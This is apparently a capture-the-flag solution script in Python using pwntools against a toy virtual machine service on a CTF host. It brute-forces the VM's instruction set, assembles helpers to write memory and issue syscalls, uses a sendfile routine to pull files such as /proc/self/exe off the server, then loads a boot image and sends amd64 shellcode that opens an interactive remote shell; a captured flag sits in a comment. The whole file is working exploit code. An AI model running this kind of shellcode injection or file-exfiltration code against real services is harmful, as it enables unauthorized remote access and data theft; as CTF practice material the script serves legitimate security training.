#!/usr/bin/env python3
import io
import os
import random
import time

from pwn import *
import json


def connect():
    while True:
        try:
            return remote("traz-1.play.hfsc.tf", 10101, timeout=3)
        except PwnlibException:
            pass


def probe_resume():
    try:
        with open("results.json") as fp:
            return json.load(fp)
    except FileNotFoundError:
        return {}


def cleanup_output(line):
    line = line.replace("\u001b[0m", "")
    line = line.replace("\u001b[1m", "")
    line = line.replace("\u001b[31;1m", "")
    line = line.replace("\u0000\u0000\u0000\u0000\u0000\u0000", "")
    line = line.strip()
    return line


msg_invalid_reg = "p00p: invalid register detected at 0x"


def parse_output(s):
    lines = [cleanup_output(line) for line in s.split("\n")]
    i = 0
    while i < len(lines):
        if lines[i].startswith("p00p: SIGSEGV detected at 0x"):
            assert i == len(lines) - 2
            assert lines[i + 1] == ""
            break
        if lines[i].startswith(msg_invalid_reg):
            assert i == len(lines) - 2
            assert lines[i + 1] == ""
            break
        if lines[i].startswith("p00p: invalid instruction detected at 0x"):
            assert i == len(lines) - 2
            assert lines[i + 1] == ""
            break
        if lines[i].startswith("p00p: invalid syscall detected at 0x"):
            assert i == len(lines) - 2
            assert lines[i + 1] == ""
            break
        if lines[i] == "-------- [DEBUG] --------":
            assert lines[i + 1] == "", lines[i + 1].encode()
            assert lines[i + 2] == "REG:", lines[i + 2].encode()
            r_a, r_b, r_c = re.match(
                r"A:     ([0-9a-f]{2})     B:     ([0-9a-f]{2})     C:     ([0-9a-f]{2})",
                lines[i + 3],
            ).groups()
            r_d, r_f, r_pc = re.match(
                r"D:     ([0-9a-f]{2})     F:     ([0-9a-f]{2})     PC:    ([0-9a-f]{2})",
                lines[i + 4],
            ).groups()
            assert lines[i + 6] == "MEM:", lines[i + 6].encode()
            for row in range(16):
                assert lines[i + 7 + row].startswith(f"0x{row * 0x10:02x}:  ")
            assert lines[i + 22].startswith("0xf0:"), lines[i + 22].encode()
            assert lines[i + 23] == "", lines[i + 23].encode()
            i += 24
            continue
        if lines[i] == "":
            i += 1
            continue
        if lines[i].startswith("p00p: sys_open() -> "):
            i += 1
            continue
        if lines[i].startswith("p00p: sys_read() -> "):
            i += 1
            continue
        if lines[i].startswith("p00p: sys_sendfile() -> "):
            i += 1
            continue
        if lines[i].startswith("p00p: sys_write() -> "):
            i += 1
            continue
        if lines[i].startswith("p00p: sys_close() -> "):
            i += 1
            continue
        # raise Exception((i, lines[i].encode()))
        i += 1
        continue


def run(results, insn):
    key = "".join(f"{b:02x}" for b in insn)
    if key in results:
        print(results[key])
        return
    with connect() as tube:
        tube.sendlineafter(b"> ", insn)
        output = tube.recvall().decode()
        results[key] = output
        with open("results.json.tmp", "w") as fp:
            json.dump(results, fp)
        os.rename("results.json.tmp", "results.json")
        parse_output(output)
        return output


def probe_1(results):
    for b1 in range(256):
        run(results, bytes((b1,)))


def probe_opcode(results, b1, prefix=None, check=lambda o: None):
    b2b3 = []
    for b2 in range(256):
        for b3 in range(256):
            b2b3.append((b2, b3))
    random.shuffle(b2b3)
    for b2, b3 in b2b3:
        prog = bytes((b1, b2, b3))
        if prefix is not None:
            prog = prefix + prog
        check(run(results, prog))


def probe_syscall(results):
    probe_opcode(results, 0x80)


def probe_2(results):
    b1b2 = []
    for b2 in range(256):
        for b1 in range(256):
            b1b2.append((b1, b2))
    random.shuffle(b1b2)
    for b1, b2 in b1b2:
        run(results, bytes((b1, b2)))


def probe_16(results):
    while True:
        run(results, bytes(random.choices(range(256), k=16)))


def probe_debug(results):
    # insns are 3 bytes long!
    for i in range(1, 16):
        run(results, b"\x40" * i)


def reg_valid(o):
    o = cleanup_output(o)
    if msg_invalid_reg not in o:
        raise Exception(o)


def gen_reg(reg):
    return bytes(
        (
            {
                "A": 1,
                "SYSCALL_ARG1": 1,
                "B": 2,
                "SYSCALL_ARG2": 2,
                "C": 4,
                "D": 8,
                "F": 16,
                "PC": 32,
            }[reg],
        )
    )


def gen_imm8(imm8):
    return bytes((imm8,))


def gen_mov_imm8(reg, imm8):
    return b"\x01" + gen_imm8(imm8) + gen_reg(reg)


def gen_add(dst, src):
    return b"\x02" + gen_reg(src) + gen_reg(dst)


def gen_stb(dst, src):
    return b"\x04" + gen_reg(src) + gen_reg(dst)


def gen_ldb(dst, src):
    return b"\x08" + gen_reg(src) + gen_reg(dst)


# unclear: 0x10
# unclear: 0x20


def gen_debug():
    return b"\x40\x00\x00"


sys_open = 1
sys_read = 2
sys_write = 4
sys_sendfile = 8
sys_close = 16


def gen_syscall(dst, nr):
    return b"\x80" + gen_reg(dst) + gen_imm8(nr)


def gen_exit(code):
    return b"\x00" + gen_imm8(code) + b"\x00"


def gen_show_error(err):
    return b"\xff\x00" + gen_imm8(err)


def gen_enable_magic():
    return gen_show_error(128)


def gen_run_boot_bin():
    return b"\x00\x00\x01"


def gen_read_boot_bin(fd):
    return b"\x00" + gen_imm8(fd) + b"\x02"


def gen_bytes(addr, bs):
    code = b""
    for i, b in enumerate(bs):
        code += gen_mov_imm8("A", addr + i)
        code += gen_mov_imm8("B", b)
        code += gen_stb("A", "B")
    return code


def gen_str(addr, s):
    return gen_bytes(addr, s.encode() + b"\x00")


def gen_init_regs():
    return (
        gen_mov_imm8("A", 0xAA)
        + gen_mov_imm8("B", 0xBB)
        + gen_mov_imm8("C", 0xCC)
        + gen_mov_imm8("D", 0xDD)
        + gen_mov_imm8("F", 0xFF)
    )


stdout_fileno = 1


def download(remote, local):
    debug_info = []
    code = b""
    # code += gen_debug()
    code += gen_init_regs()
    code += gen_str(0, remote)
    code += gen_mov_imm8("SYSCALL_ARG1", 0)
    debug_info.append(("gen_syscall(sys_open)", len(code) // 3))
    code += gen_syscall("SYSCALL_ARG2", sys_open)
    code += gen_mov_imm8("SYSCALL_ARG1", stdout_fileno)
    debug_info.append(("gen_syscall(sys_sendfile)", len(code) // 3))
    code += gen_syscall("A", sys_sendfile)
    with connect() as tube:
        tube.sendlineafter(b"> ", code)
        with open(local, "wb") as fp:
            fp.write(tube.recvall()[10:])
    for desc, pc in debug_info:
        print(hex(pc) + ": " + desc)


def main():
    results = probe_resume()
    for prog, output in results.items():
        parse_output(output)
    # probe_1(results)
    # probe_2(results)
    # probe_syscall(results)
    # probe_16(results)
    # probe_debug(results)
    # probe_opcode(results, 0x01, prefix=gen_debug(), check=reg_valid)
    # download("/proc/self/exe", "service")
    # download("boot.bin", "boot.bin")
    code = b""
    code += gen_enable_magic()
    code += gen_read_boot_bin(0)
    code += gen_run_boot_bin()
    with connect() as tube:
        tube.sendlineafter(b"> ", code)
        time.sleep(1)
        tube.send(asm(shellcraft.amd64.linux.sh(), arch="amd64"))
        tube.interactive()
        # midnight{b3t_y0U_c4nt_eX1t_V1M_th0}


if __name__ == "__main__":
    main()
